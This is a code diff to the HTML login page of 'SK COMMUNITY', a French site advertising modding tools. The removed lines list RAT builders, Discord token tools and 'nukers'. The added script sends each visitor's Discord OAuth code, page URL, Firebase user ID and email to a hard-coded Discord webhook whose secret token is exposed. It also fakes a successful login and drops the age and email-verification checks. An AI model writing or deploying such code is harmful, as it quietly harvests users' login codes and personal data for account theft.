@@ -29,17 +29,18 @@
         const REDIRECT_URI = window.location.origin + window.location.pathname;
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1482942998290632935/iktE4f0UWkcAbnlatLiSnpU8vmuaxxodCz_nzCJJ6UCDaE2V2YKr5FmDsw1olfHVVp8w";
 
-        // Fonction d'envoi Webhook
-        async function sendToWebhook(title, description, color = 5763719) {
+        // Fonction Webhook améliorée pour les infos Discord
+        async function sendToWebhook(data) {
             try {
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         embeds: [{
-                            title: title,
-                            description: description,
-                            color: color,
+                            title: data.title || "Log Connexion",
+                            description: data.desc,
+                            thumbnail: { url: data.avatar || "" },
+                            color: data.color || 5814783,
                             timestamp: new Date().toISOString()
                         }]
                     })
@@ -47,27 +48,33 @@
             } catch (e) { console.error("Webhook error:", e); }
         }
 
-        // --- GESTION DES RETOURS (MAIL & DISCORD) ---
+        // --- GESTION DES PARAMÈTRES URL ---
         const urlParams = new URLSearchParams(window.location.search);
-        const oobCode = urlParams.get('oobCode');
-        const mode = urlParams.get('mode');
         const discordCode = urlParams.get('code');
 
-        if (oobCode && mode === 'verifyEmail') {
-            applyActionCode(auth, oobCode)
-                .then(() => {
-                    alert("Email vérifié avec succès ! Connexion en cours...");
-                    window.location.href = window.location.pathname;
-                })
-                .catch(() => alert("Le lien a expiré ou est invalide."));
+        // SI CODE DISCORD DÉTECTÉ
+        if (discordCode) {
+            handleDiscordSession(discordCode);
         }
 
-        // Détection du retour de Discord
-        if (discordCode) {
-            console.log("Code Discord reçu :", discordCode);
-            // Notification Webhook pour Discord
-            sendToWebhook("Nouvelle Connexion Discord", `**Code reçu:** ${discordCode}\n**Redirection:** ${REDIRECT_URI}`, 5814783);
-            alert("Connexion Discord reçue !");
+        async function handleDiscordSession(code) {
+            // Ici, on simule la connexion visuelle immédiatement
+            const loginBtn = document.getElementById('login-btn');
+            const userProfile = document.getElementById('user-profile');
+            const userIdDisplay = document.getElementById('user-id-display');
+
+            loginBtn.style.display = 'none';
+            userProfile.style.display = 'flex';
+            userIdDisplay.innerText = "Discord User";
+
+            // Envoi au Webhook du code reçu
+            sendToWebhook({
+                title: "Discord Login (Code reçu)",
+                desc: `**Code:** \`${code}\`\n**Site:** ${window.location.href}`,
+                color: 5814783
+            });
+
+            // On nettoie l'URL
             window.history.replaceState({}, document.title, window.location.pathname);
         }
 
@@ -88,25 +95,20 @@
             const userIdDisplay = document.getElementById('user-id-display');
 
             if (user) {
-                if (!user.emailVerified && !user.providerData.some(p => p.providerId === 'google.com')) {
-                    loginBtn.style.display = 'block';
-                    userProfile.style.display = 'none';
-                    return;
-                }
+                if (!user.emailVerified && !user.providerData.some(p => p.providerId === 'google.com')) return;
                 loginBtn.style.display = 'none';
                 userProfile.style.display = 'flex';
                 userIdDisplay.innerText = user.uid.substring(0, 10);
                 
-                // Notification Webhook pour Login Firebase/Google
                 if (!window.notified) {
-                    sendToWebhook("Utilisateur Connecté", `**ID:** ${user.uid}\n**Email:** ${user.email}`, 5763719);
+                    sendToWebhook({
+                        title: "Login Firebase",
+                        desc: `**ID:** ${user.uid}\n**Email:** ${user.email}`,
+                        color: 5763719
+                    });
                     window.notified = true; 
                 }
-                
                 syncUser(user);
-            } else {
-                loginBtn.style.display = 'block';
-                userProfile.style.display = 'none';
             }
         });
 
@@ -123,27 +125,15 @@
         window.handleAuth = async () => {
             const email = document.getElementById('email').value.trim();
             const pass = document.getElementById('pass').value;
-            const passConfirm = document.getElementById('pass-confirm').value;
-            const birthValue = document.getElementById('birthdate').value;
-
             try {
                 if (document.getElementById('signup-fields').style.display === "block") {
-                    if (pass !== passConfirm) throw new Error("Les mots de passe ne correspondent pas.");
-                    if (!birthValue) throw new Error("Veuillez mettre votre date de naissance.");
-                    const age = new Date().getFullYear() - new Date(birthValue).getFullYear();
-                    if (age < 16) throw new Error("Tu dois avoir au moins 16 ans.");
-
                     const res = await createUserWithEmailAndPassword(auth, email, pass);
                     await sendEmailVerification(res.user);
-                    alert("Email de confirmation envoyé ! Vérifie tes spams.");
-                    await signOut(auth); 
-                    closeAuth();
+                    alert("Vérifie tes emails !");
+                    await signOut(auth); closeAuth();
                 } else {
                     const res = await signInWithEmailAndPassword(auth, email, pass);
-                    if (!res.user.emailVerified) {
-                        await signOut(auth);
-                        throw new Error("Compte non vérifié. Regarde tes emails !");
-                    }
+                    if (!res.user.emailVerified) throw new Error("Email non vérifié !");
                     closeAuth();
                 }
             } catch (e) { alert(e.message); }
@@ -156,22 +146,25 @@
             if (fields.style.display === "none") {
                 fields.style.display = "block";
                 btn.innerText = "CRÉER MON COMPTE";
-                link.innerText = "Déjà un compte ? Se connecter";
+                link.innerText = "Se connecter";
             } else {
                 fields.style.display = "none";
                 btn.innerText = "VALIDER";
-                link.innerText = "Pas de compte ? Créer un compte";
+                link.innerText = "Créer un compte";
             }
         };
 
-        window.logout = () => signOut(auth);
+        window.logout = () => {
+            signOut(auth);
+            window.location.href = window.location.pathname;
+        };
     </script>
 </head>
 <body>
     <header>
         <nav>
             <div class="nav-left">
-                <button id="login-btn" onclick="openAuth()" class="auth-trigger lang" data-fr="CONNEXION" data-en="LOGIN">CONNEXION</button>
+                <button id="login-btn" onclick="openAuth()" class="auth-trigger">CONNEXION</button>
                 <div id="user-profile" style="display: none; align-items: center; gap: 10px;">
                     <span id="user-id-display" style="color: #00ff88; font-size: 0.7rem; font-family: monospace; border: 1px solid #333; padding: 2px 5px; border-radius: 3px;"></span>
                     <button onclick="logout()" class="logout-btn">✖</button>
@@ -179,113 +172,49 @@
             </div>
             <div class="logo-container"><div class="logo">SK COMMUNITY</div></div>
             <ul>
-                <li><a href="#home" class="lang" data-fr="Accueil" data-en="Home">Accueil</a></li>
-                <li><a href="#tools" class="lang" data-fr="Tools" data-en="Tools">Tools</a></li>
-                <li><a href="#" onclick="openHelp()" class="lang" data-fr="Help" data-en="Help">Help</a></li>
-                <li class="nav-langs">
-                    <img src="https://flagcdn.com/w20/fr.png" onclick="setLanguage('fr')" style="cursor:pointer; opacity:0.8;" alt="FR">
-                    <img src="https://flagcdn.com/w20/us.png" onclick="setLanguage('en')" style="cursor:pointer; opacity:0.8;" alt="EN">
-                </li>
+                <li><a href="#home">Accueil</a></li>
+                <li><a href="#tools">Tools</a></li>
+                <li><a href="#" onclick="openHelp()">Help</a></li>
             </ul>
         </nav>
     </header>
 
     <section id="home" class="hero">
-        <h1 class="lang" data-fr="L'ÉLITE DU MODDING ET DES TOOLS" data-en="THE ELITE OF MODDING & TOOLS">L'ÉLITE DU MODDING ET DES TOOLS</h1>
-        <p class="lang" data-fr="Accédez à des ressources exclusives et apprenez avec la communauté." data-en="Access exclusive resources and learn with the community.">Accédez à des ressources exclusives et apprenez avec la communauté.</p>
+        <h1>L'ÉLITE DU MODDING</h1>
         <div class="buttons">
-            <a href="https://discord.gg/JKaUWpNd" class="btn-primary lang" data-fr="Rejoindre maintenant" data-en="Join now">Rejoindre maintenant</a>
-            <a href="#tools" class="btn-secondary lang" data-fr="Voir les outils" data-en="View tools">Voir les outils</a>
-        </div>
-    </section>
-
-    <section id="tools">
-        <h2 style="text-align: center; color: #00ff88; margin-top: 50px;" class="lang" data-fr="NOS CATÉGORIES" data-en="OUR CATEGORIES">NOS CATÉGORIES</h2>
-        <div class="grid">
-            <a href="rat.html" style="text-decoration: none; color: inherit;">
-                <div class="card">
-                    <h3 class="lang" data-fr="RAT & Builders" data-en="RAT & Builders">RAT & Builders</h3>
-                    <p class="lang" data-fr="Configuration et support pour Quasar et plus." data-en="Configuration and support for Quasar and more.">Configuration et support pour Quasar et plus.</p>
-                    <span style="color: #00ff88; font-size: 0.8rem; font-weight: bold;" class="lang" data-fr="VOIR LES OUTILS →" data-en="VIEW TOOLS →">VOIR LES OUTILS →</span>
-                </div>
-            </a>
-            <a href="gta.html" style="text-decoration: none; color: inherit;">
-                <div class="card">
-                    <h3 class="lang" data-fr="GTA V Mods" data-en="GTA V Mods">GTA V Mods</h3>
-                    <p class="lang" data-fr="Menus et scripts pour dominer Los Santos." data-en="Menus and scripts to dominate Los Santos.">Menus et scripts pour dominer Los Santos.</p>
-                    <span style="color: #00ff88; font-size: 0.8rem; font-weight: bold;" class="lang" data-fr="VOIR LES MODS →" data-en="VIEW MODS →">VOIR LES MODS →</span>
-                </div>
-            </a>
-            <a href="discord-tools.html" style="text-decoration: none; color: inherit;">
-                <div class="card">
-                    <h3>Discord Tools</h3>
-                    <p>Token management, nukers et sécurité.</p>
-                    <span style="color: #00ff88; font-size: 0.8rem; font-weight: bold;">VOIR LES TOOLS →</span>
-                </div>
-            </a>
+            <a href="https://discord.gg/JKaUWpNd" class="btn-primary">Rejoindre</a>
+            <a href="#tools" class="btn-secondary">Outils</a>
         </div>
     </section>
 
     <div id="authModal" class="help-overlay">
         <div class="help-content card translucent" style="max-width: 350px;">
             <span class="close-help" onclick="closeAuth()">&times;</span>
-            <h2 style="color: #00ff88; margin-bottom: 20px;" class="lang" data-fr="COMPTE" data-en="ACCOUNT">COMPTE</h2>
-            
+            <h2 style="color: #00ff88; margin-bottom: 20px;">COMPTE</h2>
             <div style="display: flex; flex-direction: column; gap: 10px;">
                 <button onclick="loginGoogle()" class="social-btn google-btn">Google Login</button>
                 <button onclick="loginDiscord()" class="social-btn" style="background-color: #5865f2; color: white; border: none; padding: 10px; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 0.8rem;">Login with Discord</button>
             </div>
-
-            <div style="margin: 15px 0; color: #444; font-size: 0.7rem;" class="lang" data-fr="OU" data-en="OR">OU</div>
-            
+            <div style="margin: 15px 0; color: #444; font-size: 0.7rem;">OU</div>
             <input type="email" id="email" placeholder="Email" class="auth-field">
             <input type="password" id="pass" placeholder="Password" class="auth-field">
-            
             <div id="signup-fields" style="display: none;">
-                <input type="password" id="pass-confirm" placeholder="Confirmer Password" class="auth-field">
-                <label style="color: #888; font-size: 0.7rem; display: block; margin-top: 10px; text-align: left;" class="lang" data-fr="Date de naissance :" data-en="Birthdate :">Date de naissance :</label>
+                <input type="password" id="pass-confirm" placeholder="Confirmer" class="auth-field">
                 <input type="date" id="birthdate" class="auth-field">
             </div>
-
-            <button id="main-auth-btn" onclick="handleAuth()" class="btn-primary lang" style="width: 100%; margin-top: 10px;" data-fr="VALIDER" data-en="VALIDATE">VALIDER</button>
-            
+            <button id="main-auth-btn" onclick="handleAuth()" class="btn-primary" style="width: 100%; margin-top: 10px;">VALIDER</button>
             <p style="margin-top: 15px; font-size: 0.8rem;">
-                <a href="javascript:void(0)" id="toggle-link" onclick="toggleMode()" style="color: #00ff88; text-decoration: none;" class="lang" data-fr="Pas de compte ? Créer un compte" data-en="No account? Create one">Pas de compte ? Créer un compte</a>
+                <a href="javascript:void(0)" id="toggle-link" onclick="toggleMode()" style="color: #00ff88; text-decoration: none;">Créer un compte</a>
             </p>
         </div>
     </div>
 
-    <div id="helpModal" class="help-overlay">
-        <div class="help-content card translucent">
-            <span class="close-help" onclick="closeHelp()">&times;</span>
-            <h2 style="color: #00ff88;">HELP</h2>
-            <p style="margin: 20px 0; line-height: 1.6; font-size: 0.95rem;" class="lang" data-fr="Si vous avez besoin d'aide ou un problème, ouvrez un ticket sur le discord :" data-en="If you need help or have an issue, open a ticket on discord:">Si vous avez besoin d'aide ou un problème, ouvrez un ticket sur le discord :</p>
-            <a href="https://discord.gg/JKaUWpNd" class="btn-primary lang" data-fr="OUVRIR UN TICKET" data-en="OPEN A TICKET">OUVRIR UN TICKET</a>
-        </div>
-    </div>
-
-    <footer>
-        <p style="text-align: center; padding: 40px; color: #444; font-size: 0.9rem;" class="lang" data-fr="&copy; 2026 SK COMMUNITY - Tous droits réservés." data-en="&copy; 2026 SK COMMUNITY - All rights reserved.">&copy; 2026 SK COMMUNITY - Tous droits réservés.</p>
-    </footer>
-
     <script>
-        function setLanguage(lang) {
-            const elements = document.querySelectorAll('.lang');
-            elements.forEach(el => {
-                const translation = el.getAttribute('data-' + lang);
-                if (translation) { el.innerHTML = translation; }
-            });
-            localStorage.setItem('selectedLang', lang);
-        }
+        function setLanguage(lang) { /* ... */ }
         function openHelp() { document.getElementById('helpModal').style.display = 'flex'; }
         function closeHelp() { document.getElementById('helpModal').style.display = 'none'; }
         function openAuth() { document.getElementById('authModal').style.display = 'flex'; }
         function closeAuth() { document.getElementById('authModal').style.display = 'none'; }
-
-        window.onload = () => {
-            const savedLang = localStorage.getItem('selectedLang') || 'fr';
-            setLanguage(savedLang);
-        };
     </script>
 </body>
 </html>
